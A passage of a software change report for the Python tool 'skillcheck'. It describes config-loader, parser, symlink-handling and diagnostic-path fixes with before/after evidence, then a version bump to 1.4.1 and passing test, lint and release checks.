- `tests/test_history_io.py`: `test_load_sweeps_stale_tmp_files`.

VERIFY:
```
stale tmp swept on load: True
ledger still loads: True
```

Tests added: `test_load_sweeps_stale_tmp_files`.

### 4.4 config_loader improvements

Finding: four issues in `config_loader.py`.

FIX (files touched):
- `src/skillcheck/config_loader.py`:
  1. The int/bool/str type-error messages now include `(got {value!r})`.
  2. The 3.10 fallback parser strips inline comments with `_strip_inline_comment`, which ignores `#` inside a
     double-quoted value (`format = "a#b"  # c` -> `a#b`).
  3. `find_config` stops ascending at a directory containing `.git` or the user's home, so it cannot pick up an
     unrelated config above the repo.
- `src/skillcheck/cli.py`: `_apply_config` prints `Loaded config from {path}` to stderr when a config is found.
- `tests/test_config_loader.py` (new module).

VERIFY:
```
1. Config key 'max-lines' must be an integer (got 'notint').
2. _strip_inline_comment('format = "a#b"  # real comment') -> 'format = "a#b"  '   ; parse -> {'format': 'a#b'}
3. find_config(nested SKILL.md) with a config above a .git root -> None
4. $ skillcheck /tmp/cfg2/SKILL.md ...  (stderr) Loaded config from /tmp/cfg2/skillcheck.toml
```

Tests added: `test_int_type_error_includes_offending_value`, `test_bool_type_error_includes_offending_value`,
`test_str_type_error_includes_offending_value`, `test_strip_inline_comment_respects_quotes`,
`test_fallback_parser_keeps_hash_inside_quotes`, `test_find_config_stops_at_git_root`,
`test_find_config_finds_config_at_git_root`, `test_cli_reports_loaded_config_path`.

### 4.5 Small batch

**(a) parser.py empty frontmatter.** `---\n---` was not recognized; the delimiters leaked into the body and its
line count. The newline before the closing `---` is now optional.
Before: `body startswith ---: True, body_lines: 3`. After: `frontmatter {} , body startswith ---: False, body_lines: 1`.
Test: `test_empty_frontmatter_is_recognized`.

**(b) commands.py collect_paths symlinks.** Switched `Path.rglob` to `os.walk(followlinks=False)` so a directory
symlink cannot pull in foreign files or hang on a cycle. On the local Python 3.12 rglob already did not follow
the foreign symlink, but os.walk makes the behavior explicit and version-independent.
Test: `test_collect_paths_does_not_follow_directory_symlinks` (skipped on Windows).

**(c) disclosure.py table bloat.** `check_body_bloat` summed every `|`-row body-wide as one table.
Before: three 12-row tables -> "Table with 36 data rows" (false). After: three small tables -> no diagnostic;
one 26-row table -> flagged. Grouped contiguous `|`-runs via `_contiguous_table_runs`.
Test: `test_body_bloat_does_not_sum_separate_small_tables`.

**(d) pyproject Typed classifier.** Added `Typing :: Typed` so PyPI advertises the shipped `py.typed`.

**(e) tokenizer offline claim.** `estimate_tokens` docstring corrected: tiktoken downloads `cl100k_base` on first
use (needs network or a warm cache); only later runs are offline. The whitespace fallback is always offline.

**(f) references.py host-path leak.** Broken-link/escape diagnostic `context` echoed the resolved absolute path.
Before: `resolved to: /tmp/tmp.../skill/scripts/missing.py`. After: `resolved to: scripts/missing.py` (relative;
escapes show `../..` traversal). New `_relative_to_skill_dir` helper.
Test: assertion added to `test_broken_ref_detected` (`context == "resolved to: does-not-exist.txt"`, no host path).

VERIFY: `python3 -m pytest tests/ -q` (full-suite gate below); each targeted module passes; ruff/mypy clean.

---

## Version bump and final gate

Bumped to `1.4.1` in `pyproject.toml`, `src/skillcheck/__init__.py`, `skills/skillcheck/SKILL.md` (self-host
frontmatter), and the README pre-commit `rev:` (guarded by `test_version_coherence` and the Makefile drift grep).
CHANGELOG restructured: Phases 1-3 (plus the pre-existing infra entries) under `## [1.4.1] - 2026-07-09`;
Phase 4 under `## [Unreleased]`. README test count synced to 832.

```
$ python3 -m pytest tests/ -q
Required test coverage of 68% reached. Total coverage: 72.18%
832 passed in 54.95s          # 0 failures, 0 skips on Linux

$ ruff check src tests scripts
All checks passed!

$ mypy src/skillcheck
Success: no issues found in 48 source files

$ make verify-release
... ruff/mypy/pytest pass ...
OK: no 0.2.0 references in release files
OK: no @v0 in README
OK: README pre-commit rev matches v1.4.1
Successfully built skillcheck-1.4.1.tar.gz and skillcheck-1.4.1-py3-none-any.whl   # build check now actually runs

$ grep -rn 'uses:' .github/workflows/ | grep -vE '@[0-9a-f]{40}'
(no output)  ->  every third-party action SHA-pinned
```

All phases complete. Every fix landed with before/after evidence, a test, a CHANGELOG entry, and a conventional
commit. The one finding that did not reproduce (3.3a, the cli.py choice re-validation) is documented above with
the command proving it is reachable, and was left in place rather than deleted.
